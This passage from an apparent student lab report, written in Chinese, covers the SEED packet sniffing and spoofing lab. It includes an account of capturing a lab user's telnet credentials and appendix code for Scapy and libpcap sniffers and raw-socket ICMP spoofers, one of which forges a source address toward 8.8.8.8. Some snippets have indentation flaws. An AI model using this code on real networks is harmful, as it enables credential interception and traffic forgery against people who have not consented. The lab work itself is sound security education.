src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180933482.png"></p><p>可以发现在主机B中，只发送了3个ping请求报文，但是却收到了6个响应报文，并且在攻击者主机中嗅探中，可以发现每次嗅探到一个请求报文，就会伪造一份响应报文，证明伪造成功。</p><h3 id="4-2-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets"><a href="#4-2-Lab-Task-Set-2-Writing-Programs-to-Sniff-and-Spoof-Packets" class="headerlink" title="4.2 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets"></a>4.2 Lab Task Set 2: Writing Programs to Sniff and Spoof Packets</h3><h4 id="4-2-1-Writing-Packet-Sniffing-Program"><a href="#4-2-1-Writing-Packet-Sniffing-Program" class="headerlink" title="4.2.1 Writing Packet Sniffing Program"></a>4.2.1 Writing Packet Sniffing Program</h4><p>Task 2.1A: Understanding How a Sniffer Works</p><p>运行结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180935811.png"></p><p>问题回答：</p><p>A1：首先调用pcap对指定的enps03网卡进行监听，然后在过滤器中设置过滤规则，最后进行数据包的捕获。</p><p>A2：嗅探数据报涉及到隐私安全的问题，如果任何用户都可以执行这一操作，便可以通过嗅探到的数据进行分析，从而获取他人隐私，显然是不安全的。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180936659.png"></p><p>A3： 打开混在模式可以监听网段下其他网卡发送的数据包，如果关闭就只能够监听到本机的数据包。</p><p>Task 2.1B: Writing Filters</p><p>捕获两个特定主机间的icmp数据包</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180936121.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180937097.png"></p><p>捕获目的端口为10-100的tcp数据包</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180937901.png"></p><p>Task 2.1C: Sniffing Passwords</p><p>在攻击者主机中执行嗅探程序，同时在主机A中执行telnet 10.9.0.6 的命令，在此过程中需要输入用户名和密码，通过嗅探程序可以截获并且打印数据包，从而得到并破解用户的密码。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940071.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940582.png"></p><p>在截获过程中，观察到login后面得到的数据为sseeeedd，password后面得到的数据为dees，而主机本身的用户名为seed，密码为dees，证明截获到了正确的数据包，对用户名和密码捕获成功。</p><h4 id="4-2-2-Spoofing"><a href="#4-2-2-Spoofing" class="headerlink" title="4.2.2 Spoofing"></a>4.2.2 Spoofing</h4><p>执行伪造程序，并且利用wireshark进行抓包，可以成功捕获到数据包，证明伪造数据包发送成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180940700.png"></p><p>问题回答：</p><p>A4：可以随机设置报文头中的报文长度，但需要保证向socket发送的原始报文是正确的长度，否则可能会导致发送出的报文检验和不匹配从而无法收到回显报文。</p><p>A5：必须计算检验和，如按照默认的0x00，会导致报文在终点服务器检验不通过，从而被丢弃导致伪造失败。</p><p>A6：没有权限的用户不可以执行数据包的截获，发送等行为。</p><h4 id="4-2-3-Sniff-and-then-Spoof"><a href="#4-2-3-Sniff-and-then-Spoof" class="headerlink" title="4.2.3 Sniff and then Spoof"></a>4.2.3 Sniff and then Spoof</h4><p>首先在主机A上进行ping google,com ，发现无法连通，并且没有响应数据包</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180941177.png"></p><p>然后在攻击者主机中执行嗅探和伪造程序，再一次在主机A中执行ping google.com命令，可以得到如下运行结果：</p><p>可以观察到在主机A中可以成功收到icmp响应数据包，说明嗅探和伪造成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180942823.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180942271.png"></p><h2 id="五-附件"><a href="#五-附件" class="headerlink" title="五.附件"></a>五.附件</h2><p>Task1.1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n==================packet:&#123;&#125;===================\n&quot;</span>.<span class="keyword">for</span></span><br><span class="line">    mat(num))</span><br><span class="line">    pkt.show()</span><br><span class="line">    pkt = sniff(iface = <span class="string">&#x27;br-4ceb30c2d898&#x27;</span>,<span class="built_in">filter</span>=<span class="string">&#x27;src net 10.0.0.0/16&#x27;</span>,prn=print_pkt)</span><br></pre></td></tr></table></figure><p>Task1.2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">    a =IP()</span><br><span class="line">    a.dst = <span class="string">&#x27;1.2.3.4&#x27;</span></span><br><span class="line">    b = ICMP()</span><br><span class="line">    p = a/b</span><br><span class="line">    ls(a)</span><br><span class="line">    send(p,iface = <span class="string">&#x27;enp0s3&#x27;</span>)</span><br></pre></td></tr></table></figure><p>Task1.3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">a= IP()</span><br><span class="line">a.dst=<span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line">a.ttl =<span class="number">15</span></span><br><span class="line">b= ICMP()</span><br><span class="line"><span class="comment"># send(a/b)</span></span><br><span class="line">a = sr1(a/b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Source:&quot;</span>,a.src)</span><br></pre></td></tr></table></figure><p>Task1.4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line"><span class="comment"># sniff and print out icmp echo request packet</span></span><br><span class="line">     <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt <span class="keyword">and</span> pkt[ICMP].<span class="built_in">type</span> == <span class="number">8</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Original Packet.........&quot;</span>)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, pkt[IP].src)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Destination IP :&quot;</span>, pkt[IP].dst)</span><br><span class="line">         <span class="comment"># spoof an icmp echo reply packet</span></span><br><span class="line">         <span class="comment"># swap srcip and dstip</span></span><br><span class="line">         ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)</span><br><span class="line">         icmp = ICMP(<span class="built_in">type</span>=<span class="number">0</span>, <span class="built_in">id</span>=pkt[ICMP].<span class="built_in">id</span>, seq=pkt[ICMP].seq)</span><br><span class="line">         data = pkt[Raw].load</span><br><span class="line">         newpkt = ip/icmp/data</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Spoofed Packet.........&quot;</span>)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Source IP : &quot;</span>, newpkt[IP].src)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;Destination IP :&quot;</span>, newpkt[IP].dst)</span><br><span class="line">         send(newpkt, verbose=<span class="number">0</span>)</span><br><span class="line">pkt = sniff(iface = <span class="string">&#x27;vetha6b71be&#x27;</span>,<span class="built_in">filter</span>=<span class="built_in">filter</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure><p>Task2.1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">got_packet</span><span class="params">(u_char *args, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *header,<span class="type">const</span> u_char *packet)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Got a packet\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">pcap_t</span> *handle;</span><br><span class="line"> <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line"> <span class="type">char</span> filter_exp[] = <span class="string">&quot;icmp&quot;</span>;</span><br><span class="line"> bpf_u_int32 net;</span><br><span class="line"> <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line"> handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line"> <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line"> pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line"> <span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) !=<span class="number">0</span>) &#123;</span><br><span class="line">     pcap_perror(handle, <span class="string">&quot;Error:&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// Step 3: Capture packets</span></span><br><span class="line"> pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"> pcap_close(handle); <span class="comment">//Close the handle</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Task2.2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Ethernet header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ethheader</span> &#123;</span></span><br><span class="line">    u_char ether_dhost[<span class="number">6</span>]; <span class="comment">/* destination host address */</span></span><br><span class="line">    u_char ether_shost[<span class="number">6</span>]; <span class="comment">/* source host address */</span></span><br><span class="line">    u_short ether_type; <span class="comment">/* IP? ARP? RARP? etc */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* IP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_ihl:<span class="number">4</span>, <span class="comment">//IP header length</span></span><br><span class="line">    iph_ver:<span class="number">4</span>; <span class="comment">//IP version</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_tos; <span class="comment">//Type of service</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_len; <span class="comment">//IP Packet length (data + header)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_ident; <span class="comment">//Identification</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_flag:<span class="number">3</span>, <span class="comment">//Fragmentation flags</span></span><br><span class="line">    iph_offset:<span class="number">13</span>; <span class="comment">//Flags offset</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_ttl; <span class="comment">//Time to Live</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iph_protocol; <span class="comment">//Protocol type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> iph_chksum; <span class="comment">//IP datagram checksum</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">iph_sourceip</span>;</span> <span class="comment">//Source IP address</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">iph_destip</span>;</span> <span class="comment">//Destination IP address</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* ICMP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> icmp_type; <span class="comment">// ICMP message type</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> icmp_code; <span class="comment">// Error code</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_chksum; <span class="comment">//Checksum for ICMP Header and data</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_id; <span class="comment">//Used for identifying request</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> icmp_seq; <span class="comment">//Sequence number</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_sport; <span class="comment">/* source port */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_dport; <span class="comment">/* destination port */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_ulen; <span class="comment">/* udp length */</span></span><br><span class="line">    <span class="type">u_int16_t</span> udp_sum; <span class="comment">/* udp checksum */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* TCP Header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> &#123;</span></span><br><span class="line">    u_short tcp_sport; <span class="comment">/* source port */</span></span><br><span class="line">    u_short tcp_dport; <span class="comment">/* destination port */</span></span><br><span class="line">    u_int tcp_seq; <span class="comment">/* sequence number */</span></span><br><span class="line">    u_int tcp_ack; <span class="comment">/* acknowledgement number */</span></span><br><span class="line">    u_char tcp_offx2; <span class="comment">/* data offset, rsvd */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_OFF(th) (((th)-&gt;tcp_offx2 &amp; 0xf0) &gt;&gt; 4)</span></span><br><span class="line">    u_char tcp_flags;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FIN 0x01</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_SYN 0x02</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_RST 0x04</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_PUSH 0x08</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ACK 0x10</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_URG 0x20</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_ECE 0x40</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_CWR 0x80</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> TH_FLAGS</span></span><br><span class="line">    (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)</span><br><span class="line">    u_short tcp_win; <span class="comment">/* window */</span></span><br><span class="line">    u_short tcp_sum; <span class="comment">/* checksum */</span></span><br><span class="line">    u_short tcp_urp; <span class="comment">/* urgent pointer */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Psuedo TCP header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pseudo_tcp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> saddr, daddr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mbz;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ptcl;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> tcpl;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> <span class="title">tcp</span>;</span></span><br><span class="line">    <span class="type">char</span> payload[<span class="number">1500</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> *w = buf;</span><br><span class="line">    <span class="type">int</span> nleft = length;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> temp=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The algorithm uses a 32 bit accumulator (sum), adds</span></span><br><span class="line"><span class="comment"> * sequential 16 bit words to it, and at the end, folds back all</span></span><br><span class="line"><span class="comment"> * the carry bits from the top 16 bits into the lower 16 bits.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">while</span> (nleft &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        sum += *w++;</span><br><span class="line">        nleft -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* treat the odd byte at the end, if any */</span></span><br><span class="line">    <span class="keyword">if</span> (nleft == <span class="number">1</span>) &#123;</span><br><span class="line">        *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line">        sum += temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* add back carry outs from top 16 bits to low 16 bits */</span></span><br><span class="line">    sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>); <span class="comment">// add hi 16 to low 16</span></span><br><span class="line">    sum += (sum &gt;&gt; <span class="number">16</span>); <span class="comment">// add carry</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">               &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">           (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment"> Spoof an ICMP echo request using an arbitrary source IP Address</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">        (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">    icmp-&gt;icmp_type = <span class="number">8</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line">    <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">    icmp-&gt;icmp_chksum = <span class="number">0</span>;</span><br><span class="line">    icmp-&gt;icmp_chksum = in_cksum((<span class="type">unsigned</span> <span class="type">short</span> *)icmp,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">    ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;10.9.0.5&quot;</span>);</span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_ICMP;</span><br><span class="line">    ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +<span class="keyword">sizeof</span>(<span class="keyword">struct</span> icmpheader));</span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment"> Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment"> ********************************************************/</span></span><br><span class="line">    send_raw_ip_packet (ip);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Task2.3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 